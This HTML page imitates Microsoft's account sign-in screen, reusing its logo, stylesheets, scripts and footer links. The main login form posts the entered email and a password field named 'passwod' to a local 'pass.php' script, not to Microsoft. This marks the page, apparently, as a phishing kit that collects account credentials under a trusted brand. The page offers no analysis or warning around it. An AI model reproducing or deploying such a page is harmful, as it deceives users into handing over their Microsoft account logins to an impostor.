<html dir="ltr" lang="EN-US">

<head>

<link rel="preconnect" href="https://acctcdn.msauth.net" crossorigin="">


<link rel="preconnect" href="https://logincdn.msauth.net" crossorigin="">


<meta http-equiv="x-dns-prefetch-control" content="on">


<link rel="dns-prefetch" href="https://acctcdn.msauth.net/">


<link rel="dns-prefetch" href="https://acctcdn.msftauth.net/">


<link rel="dns-prefetch" href="https://acctcdnmsftuswe2.azureedge.net/">


<link rel="dns-prefetch" href="https://acctcdnvzeuno.azureedge.net/">


<link rel="dns-prefetch" href="https://logincdn.msauth.net/">


<link rel="dns-prefetch" href="https://lgincdnvzeuno.azureedge.net/">


<link rel="dns-prefetch" href="https://lgincdnmsftuswe2.azureedge.net/">


<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=Edge">


<noscript>

<meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-US&lc=1033&uaid=9e13cb1619b1497eb2833af3735b5328"/>
Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.
<br />

<br />
To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.
</noscript>

<title>
Sign in to your Microsoft account
</title>

<meta name="robots" content="none">

<meta name="PageID" content="i5030">

<meta name="SiteID" content="74335">

<meta name="ReqLC" content="1033">

<meta name="LocLC" content="1033">

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">


<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29114.2/images/favicon.ico">

<link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21033__M8MTZS7Nv0I1zR18wdR-g2.css">

<style type="text/css">

</style>

<style type="text/css">
body{display:none;}
</style>


<style type="text/css">
body{display:block !important;}
</style>

<noscript>

<style type="text/css">
body{display:block !important;}
</style>

</noscript>


<link rel="image_src" href="https://logincdn.msauth.net/16.000.29114.2/images/Windows_Live_v_thumb.jpg">


<script type="text/javascript">
window.UXResourceDependencies = [];
</script>


<script type="text/javascript" src="https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.en_Ga_tepu54xwstZuVru-log2.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-UGuFqsmCD4e4Tu32kdyOanoCrePRZoA60Z7IhwgryjiPH/XRHMs9hLb6RxWMYWvq">

</script>


<script type="text/javascript">
window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); };
</script>

<script type="text/javascript" src="https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_HMfoPSZihA0DhwJIRUciUA2.js" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-gT2iteO0uZQuuMNOGLugdUIzDoZj1uSqJvPjTevSRkgb42bgXicKMPN HE6CzqDE">

</script>

</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">

<div>

<!--  -->



<!--  -->



<div data-bind="if: activeDialog">

</div>

<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: isHelpDialogOpen()" action="pass.php">


    
<!-- ko withProperties: { '$loginPage': $data } -->

    
<div data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.G,
            showFooterLinks: true,
            useWizardBehavior: svr.BX,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">

<!--  -->



<!-- ko ifnot: useLayoutTemplates -->

<!-- /ko -->



<!-- ko if: useLayoutTemplates -->

    
<!-- ko withProperties: { '$page': $parent } -->

        
<!-- ko ifnot: isVerticalSplitTemplate -->

        
<div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr } }">

<!--  -->


    
<div id="lightboxBackgroundContainer" data-bind="component: { name: 'background-image-control',
    publicMethods: $page.backgroundControlMethods,
    event: { load: $page.backgroundImageControl_onLoad } }">

<div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">

    
<!-- ko if: smallImageUrl -->

<!-- /ko -->


    
<!-- ko if: backgroundImageUrl -->

    
<div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url('https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg');">

</div>

        
<!-- ko if: useImageMask -->

<!-- /ko -->

    
<!-- /ko -->


</div>

</div>



<!-- ko if: svr.cI -->

<!-- /ko -->



<!-- ko withProperties: { '$masterPageContext': $parentContext } -->


<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">

    
<!-- ko if: showHeader -->

<!-- /ko -->


    
<div class="template-section main-section">

        
<div class="middle" data-bind="css: { 'has-header': showHeader }">

            
<div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr } }">

<!--  -->



<!-- ko withProperties: { '$content': $data } -->


<div class="flex-column">

    
<!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder -->

<!-- /ko -->


    
<!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl -->

<!-- /ko -->


    
<div class="win-scroll">

        
<div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession && ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() && $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">


            
<!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->


        
<!-- ko if: svr.Bn -->

<!-- /ko -->


        
<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.CA && showLightboxProgress() }">

</div>


        
<!-- ko if: showLightboxProgress -->

<!-- /ko -->


        
<!-- ko if: showLogo -->

        
<div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }">

<!--  -->



<!-- ko if: bannerLogoUrl -->

<!-- /ko -->



<!-- ko if: !bannerLogoUrl && !isChinaDc -->

    
<!-- ko component: 'accessible-image-control' -->

<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->

<!-- /ko -->


<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->


<!-- ko template: { nodes: [darkImageNode], data: $parent } -->

<img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">

<!-- /ko -->


<!-- /ko -->

<!-- /ko -->


<!-- /ko -->

</div>

        
<!-- /ko -->


        
<!-- ko if: svr.c7 && paginationControlHelper.showLwaDisclaimer() -->

<!-- /ko -->


        
<!-- ko if: asyncInitReady -->

        
<div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.aw,
                disableAnimationIfAnimationEndUnsupported: svr.CE,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }">

<!--  -->



<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">

    
<!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.K) -->

<!-- /ko -->


    
<div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() && (sharedData.displayName || svr.K),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">


        
<!-- ko foreach: views -->

            
<!-- ko if: $parent.currentViewIndex() === $index() -->

                
<!-- ko template: { nodes: [$data], data: $parent } -->

<div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds },
                event: {
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }">

<!--  -->



<div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }">

<div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">

    
<div role="heading" aria-level="1" data-bind="text: title">
Sign in
</div>

    
<!-- ko if: isSubtitleVisible -->

<!-- /ko -->


</div>

</div>

<!-- ko if: pageDescription && !svr.CI -->

<!-- /ko -->



<div class="row">

    
<div role="alert" aria-live="assertive">

        
<!-- ko if: usernameTextbox.error -->

<!-- /ko -->

    
</div>


    
<div class="form-group col-md-24">

        
<!-- ko if: prefillNames().length >
 1 -->

<!-- /ko -->


        
<!-- ko ifnot: prefillNames().length >
 1 -->

        
<div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder'   (!svr.ar ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">

<!-- ko withProperties: { '$placeholderText': placeholderText } -->

    
<!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->


            
<input type="email" name="email" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-bind="
                    attr: { lang: svr.at ? null : 'en' },
                    externalCss: {
                        'input': true,
                        'text-box': true,
                        'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy: 'loginHeader'   (pageDescription && !svr.CI ? ' loginDescription usernameError' : ' usernameError'),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader usernameError" placeholder="Email, phone, or Skype">


            
<input name="passwod" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">

        
<!-- /ko -->


<!-- /ko -->


<!-- ko ifnot: usePlaceholderAttribute -->

<!-- /ko -->

</div>

        
<!-- /ko -->

    
</div>


</div>



<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">

    
<div class="row">

        
<div class="col-md-24">

            
<div class="text-13">

                
<!-- ko if: svr.As && !svr.Ag && !svr.au -->

                
<div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.J || '#',
                            ariaLabel: svr.J ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }">
No account? 
<a href="https://signup.live.com/signup?wa=wsignin1.0&rpsnv=13&rver=7.3.6963.0&wp=MBI_SSL&wreply=httpsŵaŴfŴfwww.microsoft.comŴfen-wwŴfmicrosoft-365ŵfrtcŵd1&id=74335&aadredir=1&contextid=66D6841063312D47&bk=1627888268&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=9e13cb1619b1497eb2833af3735b5328" id="signup" aria-label="Create a Microsoft account">
Create one!
</a>

</div>

                
<!-- /ko -->


                
<!-- ko if: showCantAccessAccountLink -->

<!-- /ko -->


                
<!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >
= 2 || svr.AW || isOfflineAccountVisible) -->

<!-- /ko -->


                
<!-- ko if: (availableCredsWithoutUsername().length >
 0 || svr.AW || svr.r) && !hideSignInOptions -->

                
<div class="form-group" data-bind="
                    component: { name: 'cred-switch-link-control',
                        params: {
                            serverData: svr,
                            availableCreds: availableCredsWithoutUsername(),
                            showForgotUsername: svr.AW },
                        event: {
                            switchView: noUsernameCredSwitchLink_onSwitchView,
                            redirect: onRedirect,
                            registerDialog: onRegisterDialog,
                            unregisterDialog: onUnregisterDialog,
                            showDialog: onShowDialog } }">

<!--  -->



<div class="form-group">

    
<!-- ko if: showSwitchToCredPickerLink -->

<!-- /ko -->


    
<!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->

<!-- /ko -->


    
<!-- ko if: credentialCount === 0 && showForgotUsername -->

<!-- /ko -->


</div>



<!-- ko if: credLinkError -->

<!-- /ko -->

</div>

                
<!-- /ko -->


                
<!-- ko if: svr.an -->

<!-- /ko -->

            
</div>

        
</div>

    
</div>


</div>



<!-- ko if: svr.Cz -->

<!-- /ko -->



<div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">

    
<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">

        
<div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.G,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.G && isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }">

<div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">


    
<!-- ko if: isSecondaryButtonVisible -->

<!-- /ko -->


    
<div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">

        
<!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->

        
<input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-bind="
            attr: primaryButtonAttributes,
            externalCss: {
                'button': true,
                'primary': true },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Next">

    
</div>


</div>

</div>

    
</div>


</div>



<!-- ko if: tenantBranding.BoilerPlateText -->

<!-- /ko -->

</div>

<!-- /ko -->

            
<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
            
<!-- ko if: $parent.currentViewIndex() === $index() -->

<!-- /ko -->

        
<!-- /ko -->

    
</div>


</div>

</div>

        
<!-- /ko -->


        
<input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">

        
<input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">

        
<input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">

        
<input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">

        
<input type="hidden" name="canary" data-bind="value: svr.canary" value="">

        
<input type="hidden" name="ctx" data-bind="value: ctx" value="">

        
<input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">

        
<input type="hidden" id="i0327" data-bind="attr: { name: svr.bj }, value: flowToken" name="PPFT" value="DRUTdhJ6mH1cjMAKfYa*Vhxrhpba!P!ab6S9J1wxLvZSaS0ANKJbRNNYMJc24HW0rZrsc9tEtBYzKqbMEFep!eXfTnYOVSEQVq4N4MnyOc4p4gxGlsI**qcQ3lwVnvDfksfmtOqKCA*M3PS5PWtIw2JpnnNy5nbPJgjrnvuSPqAnZfDbO3Jc0VAIqFoN*wUli7gfaxxmDNZm1Hmm*NOZOrPI7DM3n!HZwAcrD2A61QpJBbtZdsh*2ebx9myxN0UK*A$$">

        
<input type="hidden" name="PPSX" data-bind="value: svr.cz" value="Passp">

        
<input type="hidden" name="NewUser" value="1">

        
<input type="hidden" name="FoundMSAs" data-bind="value: svr.Ak" value="">

        
<input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">

        
<input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">

        
<input type="hidden" name="CookieDisclosure" data-bind="value: svr.Bn ? 1 : 0" value="0">

        
<input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0">

        
<input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">

        
<div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">

<input type="hidden" name="i2" data-bind="value: clientMode" value="1">


<input type="hidden" name="i17" data-bind="value: srsFailed" value="0">


<input type="hidden" name="i18" data-bind="value: srsSuccess">


<input type="hidden" name="i19" data-bind="value: timeOnPage" value="">

</div>

    
<!-- /ko -->

        
</div>


        
<!-- ko if: $page.showFedCredAndNewSession -->

        
<!-- ko if: $page.showFedCredButtons -->

        
<div class="promoted-fed-cred-box" data-bind="css: { 'app': $page.backgroundLogoUrl }">

            
<div class="promoted-fed-cred-content" data-bind="css: {
                'animate': $page.useCssAnimations && $page.animate(),
                'slide-out-next': $page.animate.isSlideOutNext,
                'slide-in-next': $page.animate.isSlideInNext,
                'slide-out-back': $page.animate.isSlideOutBack,
                'slide-in-back': $page.animate.isSlideInBack,
                'app': $page.backgroundLogoUrl }">


                
<!-- ko foreach: $page.otherSigninOptions -->

                
<div class="row tile">

                    
<div class="table" role="button" tabindex="0" data-bind="
                        css: { 'list-item': svr.cb },
                        pressEnter: $page.otherSigninOptionsButton_onClick,
                        click: $page.otherSigninOptionsButton_onClick,
                        ariaLabel: $data.text" aria-label="Sign-in options">


                        
<div class="table-row">

                            
<div class="table-cell tile-img medium">

                                
<!-- ko component: 'accessible-image-control' -->

<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->

<!-- /ko -->


<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->


<!-- ko template: { nodes: [darkImageNode], data: $parent } -->

<img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">

<!-- /ko -->


<!-- /ko -->

<!-- /ko -->

                            
</div>

                            
<div class="table-cell text-left content" data-bind="css: { 'content': !svr.cb }">

                                
<div data-bind="
                                    text: $data.text,
                                    attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">
Sign-in options
</div>

                            
</div>

                        
</div>

                    
</div>

                
</div>

                
<!-- /ko -->

            
</div>

        
</div>

        
<!-- /ko -->


        
<!-- ko if: $page.newSession -->

<!-- /ko -->

        
<!-- /ko -->


        
<!-- ko if: $page.showDebugDetails -->

<!-- /ko -->

    
</div>


</div>


<!-- /ko -->

</div>

        
</div>

    
</div>


    
<!-- ko if: $page.paginationControlHelper.showFooterControl -->

    
<div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">


        
<div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }">

<!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->


<div id="footerLinks" class="footerNode text-secondary">


    
<!-- ko if: showFooter -->

        
<!-- ko if: !hideTOU -->

        
<a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&uaid=9e13cb1619b1497eb2833af3735b5328" class="footer-content ext-footer-content footer-item ext-footer-item">
Terms of use
</a>

        
<!-- /ko -->


        
<!-- ko if: !hidePrivacy -->

        
<a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&uaid=9e13cb1619b1497eb2833af3735b5328" class="footer-content ext-footer-content footer-item ext-footer-item">
Privacy & cookies
</a>

        
<!-- /ko -->


        
<!-- ko if: impressumLink -->

<!-- /ko -->


        
<!-- ko if: showIcpLicense -->

<!-- /ko -->

    
<!-- /ko -->


    
<!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->

    
<a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">
...
</a>


</div>


<!-- /ko -->



<!-- ko if: svr.Cz && showLinks -->

<!-- /ko -->

</div>

    
</div>

    
<!-- /ko -->


</div>


<!-- /ko -->

</div>

        
<!-- /ko -->




<!-- /ko -->

    
<!-- /ko -->


<!-- /ko -->

</div>

    
<!-- /ko -->


</form>



<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top">

</form>



<!-- ko if: svr.af -->

<!-- /ko -->

</div>

</body>

</html>